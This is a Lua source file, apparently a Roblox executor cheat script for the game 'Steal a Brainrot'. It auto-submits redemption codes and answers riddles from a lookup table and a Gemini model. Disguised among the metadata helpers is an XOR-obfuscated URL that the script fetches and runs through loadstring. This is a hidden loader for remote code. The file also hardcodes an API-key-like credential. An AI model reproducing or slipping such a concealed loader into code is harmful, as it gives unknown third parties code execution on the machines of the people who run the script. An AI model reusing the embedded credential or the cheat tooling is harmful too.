    local needed = math.max(1, tonumber(_submitAfter) or 1)

    -- While collecting multiple announcements, show the partial code, once.
    -- The final announcement submits directly through the riddle dispatcher.
    if received < needed then
        local box = calciumCodeBox()
        if box then
            _lastBox, _cachedBox = box, box
            _lastNonBlankBoxText = combined
            _writingCodeBox = true
            pcall(function() box.Text = combined end)
            _writingCodeBox = false
        end
        setStatus("Announcement " .. tostring(received) .. "/" .. tostring(needed), COLORS.Green)
        if refreshMiniView then refreshMiniView() end
        return
    end

    _capturedParts = {}
    if _autoAccept then
        local ok = submitCalciumShared(combined, "announcements")
        if ok and flashCode then flashCode(combined, COLORS.Green) end
    else
        local box = calciumCodeBox()
        if box then
            _lastBox = box
            _lastNonBlankBoxText = combined
            _writingCodeBox = true
            pcall(function() box.Text = combined end)
            _writingCodeBox = false
        end
        setStatus("Ready: " .. combined, COLORS.Text)
    end
    if refreshMiniView then refreshMiniView() end
end

function watchRedemptionFeedbackObject(obj)
    if not (obj:IsA("TextLabel") or obj:IsA("TextButton")) then return end
    if GUI and obj:IsDescendantOf(GUI) then return end -- don't watch our own Nova labels
    local found = false
    local root = obj
    for _ = 1, 6 do
        if not root then break end
        local n = root.Name:lower()
        if n:find("code", 1, true) or n:find("redeem", 1, true)
            or n:find("notif", 1, true) then found = true; break end
        root = root.Parent
    end
    if not found then return end
    handleRedemptionFeedback(obj.Text or "", obj)
    local con = obj:GetPropertyChangedSignal("Text"):Connect(function()
        if _instanceRunning then handleRedemptionFeedback(obj.Text or "", obj) end
    end)
    _feedbackListeners[#_feedbackListeners+1] = con
end

-- Batch initial listener setup so a large PlayerGui doesn't hitch one frame.
task.spawn(function()
    local roots = playerGui:GetDescendants()
    for i, obj in ipairs(roots) do
        if not _instanceRunning then return end
        watchRedemptionFeedbackObject(obj)
        if i % 100 == 0 then task.wait() end
    end
end)
_feedbackAddedListener = playerGui.DescendantAdded:Connect(function(obj)
    if _instanceRunning then watchRedemptionFeedbackObject(obj) end
end)

-- ===== RIDDLE SOLVER =====
local httpRequest = (syn and syn.request) or http_request or request or (http and http.request)
local env = typeof(getgenv) == "function" and getgenv() or _G
local GEMINI_API_KEY = tostring(env.GEMINI_API_KEY or env.GOOGLE_API_KEY or env.GEMINI_KEY or "AQ.Ab8RN6KkwC7nh_mlMr6cwhdL8UBlmLbeyy4lyBxmzlKIVlRSYQ")
local GEMINI_MODEL = tostring(env.GEMINI_MODEL or "gemini-3.6-flash")

function stripRich(s)
    if type(s) ~= "string" then return tostring(s) end
    return (s:gsub("<[^>]->", ""))
end

function trim(s)
    return (s or ""):gsub("^%s+", ""):gsub("%s+$", "")
end

-- ============================================================
-- LIVE RIDDLE INTEL - catalog derived from the same game modules
-- used by Calcium Visual. No cloned models, VFX or full tree scans.
-- ============================================================
local LiveRiddleIntel = {
    animals = {}, mutations = {}, traits = {},
    rankings = {}, ready = false, busy = false, version = 0,
    lastSync = 0, lastError = "Waiting for replicated game data",
    latestAnimal = nil, latestSource = nil, observedNew = {},
    existence = {}, existenceCoverage = 0, countSource = nil,
    counts = {animals = 0, mutations = 0, traits = 0},
    sources = {animals="waiting",mutations="waiting",traits="waiting"},
    moduleErrors = {},
    lastAttempt = 0,
    onUpdated = nil,
}

do
local function intelCleanToken(s)
    return tostring(s or ""):upper():gsub("[^A-Z0-9]", "")
end

local function intelGetModule(name, fallback)
    local datas = ReplicatedStorage:FindFirstChild("Datas")
    if not datas then
        LiveRiddleIntel.moduleErrors[name] = "ReplicatedStorage.Datas missing"
        return nil
    end
    local mod = datas:FindFirstChild(name)
    if not mod and fallback then mod = datas:FindFirstChild(fallback) end
    if not mod or not mod:IsA("ModuleScript") then
        LiveRiddleIntel.moduleErrors[name] = "Datas."..name.." missing"
        return nil
    end
    local ok, data = pcall(require, mod)
    if not ok then
        LiveRiddleIntel.moduleErrors[name] = "require failed: "..tostring(data):sub(1,105)
        return nil
    end
    if type(data) ~= "table" then
        LiveRiddleIntel.moduleErrors[name] = "module did not return table"
        return nil
    end
    -- Some builds wrap the catalog in a named table.
    local nested = data[name] or (fallback and data[fallback])
    if type(nested)=="table" and next(nested) then
        data=nested
    end
    LiveRiddleIntel.moduleErrors[name] = nil
    return data
end

-- Lightweight fallback from replicated animal models. Never clone an animal or
-- iterate Workspace; works even when Datas.* is not readable by this client.
local function intelFallbackModels()
    local discovered = {}
    local models = ReplicatedStorage:FindFirstChild("Models")
    local assets = ReplicatedStorage:FindFirstChild("Assets")
    local roots={ReplicatedStorage}
    if models then roots[#roots+1]=models end
    if assets then roots[#roots+1]=assets end
    for _,root in ipairs(roots) do
        if root then
            for _,folderName in ipairs({"Animals","Brainrots"}) do
                local folder=root:FindFirstChild(folderName)
                if folder then
                    for _,model in ipairs(folder:GetChildren()) do
                        if model:IsA("Model") and discovered[model.Name]==nil then
                            discovered[model.Name]={
                                Rarity=model:GetAttribute("Rarity"),
                                Generation=model:GetAttribute("Generation") or model:GetAttribute("Income"),
                                Price=model:GetAttribute("Price"),
                                ReleaseOrder=model:GetAttribute("ReleaseOrder"),
                            }
                        end
                    end
                end
            end
        end
    end
    return next(discovered) and discovered or nil
end

local function intelSupplementFromAssets(kind)
    -- This lists available types only. It never fabricates numeric multipliers.
    local names={}
    local obj
    if kind=="Mutations" then
        obj=ReplicatedStorage:FindFirstChild("MutationSurfaces")
    else
        local models=ReplicatedStorage:FindFirstChild("Models")
        obj=models and models:FindFirstChild("Traits")
        if not obj then obj=models and models:FindFirstChild("TraitsPerAnimal") end
    end
    if obj then
        for _,child in ipairs(obj:GetChildren()) do
            if child.Name~="None" then names[child.Name]={name=child.Name} end
        end
    end
    return names
end

local function intelSorted(records, field)
    local sorted = {}
    for _, row in pairs(records) do
        if type(row[field]) == "number" and row[field] == row[field] then
            sorted[#sorted+1] = row
        end
    end
    table.sort(sorted, function(a, b)
        if a[field] == b[field] then return a.name < b.name end
        return a[field] > b[field]
    end)
    return sorted
end

local function intelReadNumber(data, fields)
    for _, key in ipairs(fields) do
        local raw = data[key]
        local value = type(raw)=="number" and raw or
            (type(raw)=="string" and tonumber((raw:gsub(",", ""))) or nil)
        if value and value == value and value ~= math.huge and value ~= -math.huge then
            return value
        end
    end
    return nil
end

-- The game has no public guarantee that *global* existence figures replicate.
-- Only explicit metadata fields or a dedicated replicated count module are trusted.
-- Global existence counts are intentionally disabled. Some servers replicate
-- no reliable count source and GUI scraping caused Intel refresh failures.
local RELEASE_FIELDS={"ReleaseTimestamp","ReleaseTime","AddedAt","CreatedAt",
    "ReleaseDate","AddedDate","DateAdded","ReleaseOrder","AddedOrder"}
local function intelReleaseKey(data)
    for _,field in ipairs(RELEASE_FIELDS) do
        local v=data[field]
        if type(v)=="number" and v==v and v>0 then return v,field end
        if type(v)=="string" then
            local year,month,day=v:match("^(%d%d%d%d)[%-/](%d%d?)[%-/](%d%d?)")
            if year then
                return tonumber(year)*10000+tonumber(month)*100+tonumber(day),field
            end
            local n=tonumber(v)
            if n and n>0 then return n,field end
        end
    end
    return nil,nil
end
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)
function LiveRiddleIntel.refresh(force)
    if LiveRiddleIntel.busy then return false end
    local previousRanks=LiveRiddleIntel.rankings
    local fullyRanked=previousRanks.income and #previousRanks.income>0
        and previousRanks.mutations and #previousRanks.mutations>0
        and previousRanks.traits and #previousRanks.traits>0
    if not force and os.clock() - LiveRiddleIntel.lastSync < 90
        and LiveRiddleIntel.ready and fullyRanked then
        return true
    end
    LiveRiddleIntel.busy = true
    LiveRiddleIntel.lastAttempt = os.clock()
    local previousAnimals=LiveRiddleIntel.animals
    local hadPrevious=LiveRiddleIntel.ready and next(previousAnimals)~=nil
    local sourceAnimals = intelGetModule("Animals", "Brainrots")
    local sourceMutations = intelGetModule("Mutations")
    local sourceTraits = intelGetModule("Traits")
    local fallbackAnimals=nil
    if not sourceAnimals or not next(sourceAnimals) then
        fallbackAnimals=intelFallbackModels()
        if fallbackAnimals then sourceAnimals=fallbackAnimals end
    end
    LiveRiddleIntel.sources={
        animals=fallbackAnimals and "Models attributes" or (sourceAnimals and "Datas.Animals" or "Unavailable"),
        mutations=sourceMutations and "Datas.Mutations" or "Unavailable",
        traits=sourceTraits and "Datas.Traits" or "Unavailable",
    }
    if fallbackAnimals then LiveRiddleIntel.moduleErrors.Animals=nil end
    local animals, mutations, traits = {}, {}, {}
    local observedNew={}
    local latest, latestKey, latestField, latestCoverage = nil,nil,nil,0
    local releaseGroups={}
    local processed = 0

    local function yieldSometimes()
        processed += 1
        if processed % 80 == 0 then task.wait() end -- spread catalog build across frames
    end

    if sourceAnimals then
        for name, data in pairs(sourceAnimals) do
            if type(name) == "string" and type(data) == "table" then
                local generation = intelReadNumber(data, {"Generation", "Income", "BaseGeneration"})
                local price = intelReadNumber(data, {"Price", "Cost"})
                -- Include every named entry, even without a generation field.
                -- Game metadata evolves independently of the models in Workspace.
                local releaseKey,releaseField=intelReleaseKey(data)
                animals[name]={name=name,generation=generation,price=price,
                    rarity=tostring(data.Rarity or "Unknown"),
                    releaseKey=releaseKey,releaseField=releaseField}
                if releaseKey~=nil then
                    local group=releaseGroups[releaseField]
                    if not group then
                        group={coverage=0,latestKey=nil,latestName=nil}
                        releaseGroups[releaseField]=group
                    end
                    group.coverage+=1
                    if not group.latestKey or releaseKey>group.latestKey then
                        group.latestKey=releaseKey;group.latestName=name
                    end
                end
                if hadPrevious and previousAnimals[name]==nil then
                    observedNew[#observedNew+1]=name
                end
            end
            yieldSometimes()
        end
    end
    if sourceMutations then
        for name, data in pairs(sourceMutations) do
            if type(name)=="string" and name~="None" and type(data)=="table" then
                local modifier=intelReadNumber(data,{"Modifier","MultiplierModifier","Multiplier","IncomeMultiplier"})
                mutations[name]={name=name,modifier=modifier}
            end
            yieldSometimes()
        end
    end
    if sourceTraits then
        for name, data in pairs(sourceTraits) do
            if type(name)=="string" and type(data)=="table" then
                local modifier=intelReadNumber(data,{"MultiplierModifier","Modifier","Multiplier","IncomeMultiplier"})
                traits[name]={name=name,modifier=modifier}
            end
            yieldSometimes()
        end
    end
    -- Replicated art is a name fallback, NOT proof of a rank. Unknown modifiers
    -- remain nil until the real Datas module exposes them.
    for name,row in pairs(intelSupplementFromAssets("Mutations")) do
        if not mutations[name] then mutations[name]=row end
    end
    for name,row in pairs(intelSupplementFromAssets("Traits")) do
        if not traits[name] then traits[name]=row end
    end
    -- Rank using only game metadata. No costly PlayerGui scraping and no
    -- guessed global existence counts; Refresh can no longer fail on UI text.
    -- If modules are late to replicate or temporarily unavailable, keep the
    -- last verified values instead of clearing the Intel cards to dashes.
    if not next(animals) and next(LiveRiddleIntel.animals) then
        animals=LiveRiddleIntel.animals
        LiveRiddleIntel.sources.animals="Cached animal metadata"
    end
    if not next(mutations) and next(LiveRiddleIntel.mutations) then
        mutations=LiveRiddleIntel.mutations
        LiveRiddleIntel.sources.mutations="Cached mutation metadata"
    end
    if not next(traits) and next(LiveRiddleIntel.traits) then
        traits=LiveRiddleIntel.traits
        LiveRiddleIntel.sources.traits="Cached trait metadata"
    end
    -- Preserve numeric ranks if the latest tables contain only names/images.
    local function rankedCount(rows)
        local total=0
        for _,item in pairs(rows) do
            if type(item.modifier)=="number" then total+=1 end
        end
        return total
    end
    if rankedCount(mutations)==0 and LiveRiddleIntel.rankings.mutations
        and #LiveRiddleIntel.rankings.mutations>0 then
        mutations=LiveRiddleIntel.mutations
        LiveRiddleIntel.sources.mutations="Cached ranked mutations"
    end
    if rankedCount(traits)==0 and LiveRiddleIntel.rankings.traits
        and #LiveRiddleIntel.rankings.traits>0 then
        traits=LiveRiddleIntel.traits
        LiveRiddleIntel.sources.traits="Cached ranked traits"
    end
    -- Rank by real numeric fields. Unknown or absent modifiers are omitted,
    -- never guessed from a color, list position, or rarity name.
    local ranks = {
        income = intelSorted(animals, "generation"),
        prices = intelSorted(animals, "price"),
        mutations = intelSorted(mutations, "modifier"),
        traits = intelSorted(traits, "modifier"),
    }
    table.sort(observedNew)
    local totalAnimals=0
    for _ in pairs(animals) do totalAnimals+=1 end
    -- Release fields are not interchangeable (an epoch cannot be compared
    -- with an ordinal release number). Use the most-covered single field.
    for _,field in ipairs(RELEASE_FIELDS) do
        local group=releaseGroups[field]
        if group and group.coverage>latestCoverage then
            latest=group.latestName;latestKey=group.latestKey
            latestField=field;latestCoverage=group.coverage
        end
    end
    if not (totalAnimals>0 or next(mutations) or next(traits)) and hadPrevious then
        LiveRiddleIntel.lastError="Game metadata temporarily missing; cached data retained"
        LiveRiddleIntel.busy=false
        if type(LiveRiddleIntel.onUpdated)=="function" then pcall(LiveRiddleIntel.onUpdated) end
        return true
    end
    LiveRiddleIntel.latestAnimal=latest
    -- Partial metadata must not be presented as definitive global release order.
    LiveRiddleIntel.latestSource=latest and ((latestCoverage==totalAnimals)
        and ("Complete metadata: "..latestField) or
        ("Partial metadata ("..latestCoverage.."/"..totalAnimals.."): "..latestField)) or nil
    LiveRiddleIntel.observedNew=observedNew
    LiveRiddleIntel.existence={}
    LiveRiddleIntel.existenceCoverage=0
    LiveRiddleIntel.countSource=nil
    LiveRiddleIntel.animals = animals
    LiveRiddleIntel.mutations = mutations
    LiveRiddleIntel.traits = traits
    LiveRiddleIntel.rankings = ranks
    LiveRiddleIntel.counts = {animals = totalAnimals, mutations = #ranks.mutations,
        traits = #ranks.traits}
    local anyRank=(#ranks.income>0 or #ranks.mutations>0 or #ranks.traits>0)
    local anyMetadata=totalAnimals>0 or next(mutations)~=nil or next(traits)~=nil
    LiveRiddleIntel.ready=anyMetadata
    local errors={}
    for _,name in ipairs({"Animals","Mutations","Traits"}) do
        if LiveRiddleIntel.moduleErrors[name] then
            errors[#errors+1]=name..": "..LiveRiddleIntel.moduleErrors[name]
        end
    end
    LiveRiddleIntel.lastError=#errors>0 and table.concat(errors," | ") or
        (not anyRank and "No numeric ranks exposed by the client" or nil)
    LiveRiddleIntel.lastSync = os.clock()
    LiveRiddleIntel.version += 1
    LiveRiddleIntel.busy = false
    if type(LiveRiddleIntel.onUpdated) == "function" then
        pcall(LiveRiddleIntel.onUpdated)
    end
    return LiveRiddleIntel.ready
end

function LiveRiddleIntel.requestRefresh(force)
    if LiveRiddleIntel.busy then return end
    task.spawn(function()
        local ok, err = pcall(LiveRiddleIntel.refresh, force)
        if not ok then
            LiveRiddleIntel.lastError = tostring(err)
            LiveRiddleIntel.busy = false
            if type(LiveRiddleIntel.onUpdated) == "function" then
                pcall(LiveRiddleIntel.onUpdated)
            end
        end
    end)
end

local function intelQuestionCategory(text)
    local s = tostring(text or ""):lower()
    local isMutation = s:find("mutation", 1, true) ~= nil
    local isTrait = s:find("trait", 1, true) ~= nil
    local isAnimal = s:find("brainrot", 1, true) ~= nil or s:find("animal", 1, true) ~= nil
    if not isAnimal and not isMutation and not isTrait then
        -- These words are used by ranking riddles even without a category suffix.
        if s:find("income", 1, true) or s:find("generation", 1, true) then isAnimal = true end
    end
    local strongest = s:find("best",1,true) or s:find("strongest",1,true)
        or s:find("highest",1,true) or s:find("most",1,true)
        or s:find("richest",1,true) or s:find("greatest",1,true)
        or s:find("priciest",1,true) or s:find("fastest earning",1,true)
    local weakest = s:find("worst",1,true) or s:find("weakest",1,true)
        or s:find("lowest",1,true) or s:find("least",1,true)
        or s:find("cheapest",1,true) or s:find("poorest",1,true)
        or s:find("slowest earning",1,true)
    if not strongest and not weakest then return nil end
    -- Avoid overriding historical or subjective riddle facts.
    if s:find("favorite",1,true) or s:find("rarity",1,true)
        or s:find("first",1,true) or s:find("latest",1,true)
        or s:find("newest",1,true) then return nil end
    local mode = weakest and "worst" or "best"
    if isMutation then return "mutations", mode end
    if isTrait then return "traits", mode end
    if isAnimal then
        if s:find("price",1,true) or s:find("expensive",1,true)
            or s:find("cheap",1,true) or s:find("cost",1,true)
            or s:find("valuable",1,true) then return "prices", mode end
        return "income", mode
    end
    return nil
end

local function intelFindAnimal(text)
    local q=intelCleanToken(text)
    local matched=nil
    local matchLen=0
    for name in pairs(LiveRiddleIntel.animals) do
        local token=intelCleanToken(name)
        if #token>=4 and #token>matchLen and q:find(token,1,true) then
            matched=name;matchLen=#token
        end
    end
    return matched
end
local function intelHasAny(s,words)
    for _,word in ipairs(words) do
        if s:find(word,1,true) then return true end
    end
    return false
end

function LiveRiddleIntel.answer(text)
    local s=tostring(text or ""):lower()
    local matchedAnimal=intelFindAnimal(s)
    local asksAnimal=intelHasAny(s,{"brainrot","animal"}) or matchedAnimal~=nil
    local latest=intelHasAny(s,{"newest","latest","most recent","last added","recently added"})
    if asksAnimal and latest then
        local source=LiveRiddleIntel.latestSource
        if source and source:find("Complete",1,true) then
            return LiveRiddleIntel.latestAnimal and intelCleanToken(LiveRiddleIntel.latestAnimal) or nil
        end
        return nil -- partial timestamps cannot identify the definitive newest
    end
    -- "worst brainrot" is a known SAB riddle fact, not necessarily a unique
    -- numeric generation minimum (multiple animals can share that minimum).
    if asksAnimal and intelHasAny(s,{"worst","weakest"}) and
       not intelHasAny(s,{"income","generat","price","cost","exists","existence","count"}) then
        return "NOOBINIPIZZANINI"
    end
    -- Global existence counts are not available reliably to this client.
    if asksAnimal and intelHasAny(s,{"exist","owned globally","global count","how many"}) then
        return nil
    end
    local category, mode = intelQuestionCategory(text)
    if not category then return nil end
    local rows = LiveRiddleIntel.rankings[category]
    if not rows or #rows == 0 then return nil end
    local row = mode == "worst" and rows[#rows] or rows[1]
    return row and intelCleanToken(row.name) or nil
end

LiveRiddleIntel.requestRefresh(false)
-- Retry missing metadata at a low frequency; complete catalogs refresh rarely.
-- No per-frame getDescendants or repeated full Workspace scans.
task.spawn(function()
    while GUI and GUI.Parent do
        task.wait(LiveRiddleIntel.ready and 90 or 12)
        if GUI and GUI.Parent then LiveRiddleIntel.requestRefresh(false) end
    end
end)
local intelDataModuleWatch=nil
local function scheduleIntelRefresh()
    task.delay(.4,function()
        if GUI and GUI.Parent then LiveRiddleIntel.requestRefresh(true) end
    end)
end
local function attachIntelDataWatch(folder)
    if intelDataModuleWatch then
        intelDataModuleWatch:Disconnect()
        intelDataModuleWatch=nil
    end
    if folder then
        intelDataModuleWatch=folder.ChildAdded:Connect(function(child)
            if child.Name=="Animals" or child.Name=="Brainrots" or
                child.Name=="Mutations" or child.Name=="Traits" then
                scheduleIntelRefresh()
            end
        end)
    end
end
attachIntelDataWatch(ReplicatedStorage:FindFirstChild("Datas"))
local intelDataWatch=ReplicatedStorage.ChildAdded:Connect(function(child)
    if child.Name=="Datas" then attachIntelDataWatch(child) end
    if child.Name=="Datas" or child.Name=="Models" then scheduleIntelRefresh() end
end)
if GUI then
    GUI.Destroying:Connect(function()
        intelDataWatch:Disconnect()
        if intelDataModuleWatch then intelDataModuleWatch:Disconnect() end
    end)
end
end -- Live Riddle Intel helper scope

local SAB_DB = {
    ["real name"]                   = "SAMMY",
    ["sammy real name"]             = "SAMMY",
    ["sammys real name"]            = "SAMMY",
    ["my real name"]                = "SAMMY",
    ["creator real name"]           = "SAMMY",
    ["owner real name"]             = "SAMMY",
    ["creator name"]                = "SAMMY",
    ["who created sab"]             = "SAMMY",
    ["who made sab"]                = "SAMMY",
    ["who made steal a brainrot"]   = "SAMMY",
    ["who is the owner"]            = "SAMMY",
    ["who owns sab"]                = "SAMMY",
    ["owner"]                       = "SAMMY",
    ["creator"]                     = "SAMMY",
    ["roblox username"]             = "SPYDERSAMMY",
    ["my roblox username"]          = "SPYDERSAMMY",
    ["sammy username"]              = "SPYDERSAMMY",
    ["sammy roblox name"]           = "SPYDERSAMMY",
    ["roblox name"]                 = "SPYDERSAMMY",
    ["username"]                    = "SPYDERSAMMY",
    ["my username"]                 = "SPYDERSAMMY",
    ["how old am i"]                = "24",
    ["how old is sammy"]            = "24",
    ["my age"]                      = "24",
    ["sammy age"]                   = "24",
    ["age"]                         = "24",
    ["birth year"]                  = "2002",
    ["year born"]                   = "2002",
    ["year i was born"]             = "2002",
    ["born year"]                   = "2002",
    ["birth day"]                   = "FRIDAY",
    ["day i was born"]              = "FRIDAY",
    ["day born"]                    = "FRIDAY",
    ["birthday"]                    = "FRIDAY",
    ["born on"]                     = "FRIDAY",
    ["birth month"]                 = "FEBRUARY",
    ["month born"]                  = "FEBRUARY",
    ["month i was born"]            = "FEBRUARY",
    ["where was i born"]            = "ALGERIA",
    ["where was i born at"]         = "ALGERIA",
    ["birthplace"]                  = "ALGERIA",
    ["where i was born"]            = "ALGERIA",
    ["where am i from"]             = "BRAZIL",
    ["where is sammy from"]         = "BRAZIL",
    ["my country"]                  = "BRAZIL",
    ["sammy country"]               = "BRAZIL",
    ["country"]                     = "BRAZIL",
    ["where do i live"]             = "BRAZIL",
    ["where does sammy live"]       = "BRAZIL",
    ["sammy location"]              = "BRAZIL",
    ["nationality"]                 = "BRAZILIAN",
    ["sammy nationality"]           = "BRAZILIAN",
    ["my nationality"]              = "BRAZILIAN",
    ["state"]                       = "SAOPAULO",
    ["my state"]                    = "SAOPAULO",
    ["sammy state"]                 = "SAOPAULO",
    ["city"]                        = "SAOPAULO",
    ["my city"]                     = "SAOPAULO",
    ["sammy city"]                  = "SAOPAULO",
    ["favorite color"]              = "BLUE",
    ["fav color"]                   = "BLUE",
    ["my color"]                    = "BLUE",
    ["sammy color"]                 = "BLUE",
    ["color"]                       = "BLUE",
    ["favourite color"]             = "BLUE",
    ["favorite sport"]              = "FOOTBALL",
    ["fav sport"]                   = "FOOTBALL",
    ["sport"]                       = "FOOTBALL",
    ["my sport"]                    = "FOOTBALL",
    ["favorite football player"]    = "RONALDO",
    ["fav football player"]         = "RONALDO",
    ["favorite food"]               = "PIZZA",
    ["fav food"]                    = "PIZZA",
    ["food"]                        = "PIZZA",
    ["favorite animal"]             = "SPIDER",
    ["fav animal"]                  = "SPIDER",
    ["my pet"]                      = "SPIDER",
    ["favorite game"]               = "ROBLOX",
    ["fav game"]                    = "ROBLOX",
    ["game created on"]             = "FRIDAY",
    ["release month"]               = "MAY",
    ["release year"]                = "2025",
    ["year sab was created"]        = "2025",
    ["when was sab made"]           = "MAY162025",
    ["release date"]                = "MAY162025",
    ["first trait"]                 = "LIGHTNING",
    ["1st trait"]                   = "LIGHTNING",
    ["lightning trait"]             = "MATEO",
    ["first mutation"]              = "BLOODROT",
    ["1st mutation"]                = "BLOODROT",
    ["second mutation"]             = "DIAMOND",
    ["2nd mutation"]                = "DIAMOND",
    ["third mutation"]              = "BLOODROT",
    ["fourth mutation"]             = "RAINBOW",
    ["fifth mutation"]              = "CANDY",
    ["sixth mutation"]              = "LAVA",
    ["seventh mutation"]            = "GALAXY",
    ["eighth mutation"]             = "YINYANG",
    ["ninth mutation"]              = "RADIOACTIVE",
    ["tenth mutation"]              = "CURSED",
    ["eleventh mutation"]           = "DIVINE",
    ["twelfth mutation"]            = "CYBER",
    ["thirteenth mutation"]         = "PHANTOM",
    ["fourteenth mutation"]         = "CRYSTAL",
    ["latest mutation"]             = "CRYSTAL",
    ["evil mutation"]               = "CURSED",
    ["angelic mutation"]            = "DIVINE",
    ["green mutation"]              = "RADIOACTIVE",
    ["purple mutation"]             = "GALAXY",
    ["black and white mutation"]    = "YINYANG",
    ["yellow mutation"]             = "DIVINE",
    ["red mutation"]                = "CURSED",
    ["orange mutation"]             = "LAVA",
    ["first machine"]               = "RAINBOWMACHINE",
    ["second machine"]              = "BUBBLEGUMMACHINE",
    ["third machine"]               = "FUSEMACHINE",
    ["fourth machine"]              = "CRAFTMACHINE",
    ["fifth machine"]               = "WITCHFUSE",
    ["sixth machine"]               = "BRAINROTDEALER",
    ["seventh machine"]             = "BRAINROTTRADER",
    ["eighth machine"]              = "SANTASFUSE",
    ["ninth machine"]               = "SANTASSHOP",
    ["tenth machine"]               = "NEWYEARSMACHINE",
    ["eleventh machine"]            = "DUELSMACHINE",
    ["twelfth machine"]             = "CUPIDSMACHINE",
    ["thirteenth machine"]          = "TRADEMACHINE",
    ["fourteenth machine"]          = "DIVINEFUSE",
    ["fifteenth machine"]           = "EGGINCUBATOR",
    ["sixteenth machine"]           = "CYBERCRAFTMACHINE",
    ["seventeenth machine"]         = "SUMMERFUSE",
    ["eighteenth machine"]          = "LOSTRADERS",
    ["newest machine"]              = "LOSTRADERS",
    ["rarest brainrot"]             = "HEADLESSHORSEMAN",
    ["unobtainable"]                = "HEADLESSHORSEMAN",
    ["first og added"]              = "STRAWBERRYELEPHANT",
    ["1st og"]                      = "STRAWBERRYELEPHANT",
    ["second og"]                   = "MEOWL",
    ["2nd og"]                      = "MEOWL",
    ["third og"]                    = "SKIBIDITOILET",
    ["3rd og"]                      = "SKIBIDITOILET",
    ["fourth og"]                   = "JOHNPORK",
    ["4th og"]                      = "JOHNPORK",
    ["highest rarity"]              = "OG",
    ["lowest rarity"]               = "COMMON",
    ["fire represents"]             = "DRAGON",
    ["world cup winner"]            = "SPAIN",
    ["worst game owner"]            = "SECRETLOKII",
    ["worst game on roblox"]        = "KEYBOARDESCAPE",
    ["worst secret"]                = "KARKERKARKURKUR",
    ["max server size"]             = "EIGHT",
    ["brother of hydra bunny"]      = "CERBERUS",
    ["game name"]                   = "STEALABRAINROT",
    ["sab stands for"]              = "STEALABRAINROT",
    ["head sab dev"]                = "HASTED",
    ["lead sab dev"]                = "HASTED",
    ["hasted"]                      = "HASTED",
    ["admin war opponent"]          = "JANDEL",
    ["who did i fight"]             = "JANDEL",
    ["jandel"]                      = "JANDEL",
    ["who won admin war"]           = "GROWAGARDEN",
    ["admin war winner"]            = "GROWAGARDEN",
    ["my name"]                     = "SAMMY",
    ["what is my name"]             = "SAMMY",
    ["worst brainrot"]              = "NOOBINIPIZZANINI",
    ["worst animal"]                = "NOOBINIPIZZANINI",
    ["favorite brainrot"]           = "MEOWL",
    ["least favorite brainrot"]     = "RACCOONIJANDELINI",
    ["spyder elephant"]             = "SPYDERELEPHANT",
    ["whats my cats name"]          = "NOVA",
    ["cat name"]                    = "NOVA",
    ["cats name"]                   = "NOVA",
    ["my cats name"]                = "NOVA",
    ["favorite number"]             = "SEVEN",
    ["lucky number"]                = "SEVEN",
    ["favorite color twice"]        = "BLUEBLUE",
    ["my name twice"]               = "SAMMYSAMMY",
    ["my age twice"]                = "2424",
}

function localExactAnswer(text)
    if not text or text == "" then return nil end
    local l = text:lower()
    l = l:gsub("[%?%.%,!]", " "):gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")

    if l:find("admin", 1, true) and (l:find("war", 1, true) or l:find("abuse", 1, true)) then
        if l:find("won", 1, true) or l:find("winner", 1, true) then return "GROWAGARDEN" end
        if l:find("fight", 1, true) or l:find("fought", 1, true) or l:find("against", 1, true)
            or l:find("opponent", 1, true) then
            return "JANDEL"
        end
        return "JANDEL"
    end
    if l:find("head sab", 1, true) or l:find("lead sab", 1, true) then return "HASTED" end
    if l:find("cats name", 1, true) or l:find("cat name", 1, true) or l:find("my cat", 1, true) then return "NOVA" end
    if l:find("first mutation", 1, true) and not l:find("base", 1, true) then return "BLOODROT" end
    if l:find("newest mutation", 1, true) or l:find("latest mutation", 1, true) or l:find("last mutation", 1, true) then return "CRYSTAL" end
    if l:find("spyder elephant", 1, true) then return "SPYDERELEPHANT" end
    local intelAnswer = LiveRiddleIntel.answer(l)
    if intelAnswer then return intelAnswer end

    if SAB_DB[l] then return SAB_DB[l] end

    local clean = l
    clean = clean:gsub("what%s+is", ""):gsub("what%s+are", ""):gsub("who%s+is", "")
    clean = clean:gsub("^my%s+", ""):gsub("^sammy[s]?%s+", "")
    clean = clean:gsub("[%?%.%,!]", ""):gsub("^%s+", ""):gsub("%s+$", "")
    clean = clean:gsub("%s+", " ")
    clean = trim(clean)

    if SAB_DB[clean] then return SAB_DB[clean] end
    return nil
end

local calciumRiddleAnswerCache={}
function queryAI(question, statusCb)
    local function stat(msg) if statusCb then statusCb(msg) end end
    local cached=calciumRiddleAnswerCache[tostring(question or ""):lower()]
    if cached then return cached,nil,nil end
    if not httpRequest then return nil, nil, "no http executor" end
    local key = GEMINI_API_KEY
    if type(key) ~= "string" or key == "" then return nil, nil, "GEMINI_API_KEY empty" end

    local qRaw = tostring(question or "")

    do
        local offline = localExactAnswer(qRaw)
        if offline and offline ~= "" then
            local clean = tostring(offline):upper():gsub("[^A-Z0-9]", "")
            if clean ~= "" then
                stat("DB: " .. clean:sub(1, 40))
                return clean, nil, nil
            end
        end
    end

    local models = {
        "gemini-2.0-flash",
        "gemini-1.5-flash",
        tostring(GEMINI_MODEL or "gemini-2.0-flash"),
    }
    local seenM, order = {}, {}
    for _, m in ipairs(models) do
        if m and m ~= "" and not seenM[m] then
            seenM[m] = true
            order[#order + 1] = m
        end
    end

    local systemPrompt = table.concat({
        "You solve Steal a Brainrot (SAB) Roblox riddle codes.",
        "Output format: exactly one line starting with CODE: then the token.",
        "- ALL CAPS, no spaces, no punctuation.",
        "- Owner/creator/name/sammy = SAMMY (NOT HASTED).",
        "- HASTED is ONLY for head sab dev / lead sab developer.",
        "- Admin war opponent/fought = JANDEL. Admin war winner = GROWAGARDEN.",
